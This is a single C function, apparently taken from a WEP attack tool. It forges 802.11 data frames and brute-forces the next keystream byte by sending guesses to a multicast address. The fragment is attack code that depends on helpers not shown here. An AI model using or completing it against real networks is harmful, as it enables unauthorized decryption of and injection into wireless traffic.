decrypt_packet(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;

	if (too_early(tv, es->es_txto_decrypt, &es->es_txlast))
		return;

	memset(buf, 0, sizeof(buf));


	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;
	memcpy(wh->i_addr3, S_MCAST, 5);
	wh->i_addr3[5] = es->es_prga_d[es->es_prga_dlen];


	memcpy(data, es->es_prga_div, 3);
	data += 4;
	dlen = es->es_prga_dlen - 4 + 1;
	memcpy(data, es->es_clear, dlen);
	put_crc32(data, dlen);
	xor(data, data, es->es_prga_d, es->es_prga_dlen+1);

	printf_time("Guessing prga byte %d with %.2X\r",
		    es->es_prga_dlen, es->es_prga_d[es->es_prga_dlen]);
	fflush(stdout);
	send_frame(es, wh, data - buf + dlen + 4);

	es->es_prga_d[es->es_prga_dlen]++;
}
